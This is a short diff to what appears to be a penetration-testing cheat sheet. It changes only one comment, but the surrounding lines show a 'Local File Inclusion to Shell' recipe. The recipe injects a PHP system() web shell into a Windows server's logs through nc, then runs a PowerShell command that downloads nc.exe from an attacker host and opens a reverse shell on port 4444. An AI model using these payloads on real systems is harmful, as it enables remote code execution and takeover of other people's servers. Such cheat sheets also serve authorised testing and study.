@@ -125,7 +125,7 @@ gcc -m32|-m64 -o output source.c
 
 #### Local File Inclusion to Shell
 ```php
-# Log contamination for vulnerable web app on Windows + PHP
+# Vulnerable web app on Windows + PHP through contaminated logs
 1. nc $WINDOWSTARGET 80
 2. <?php system($_GET['cmd']);?>
 3. ?cmd=powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
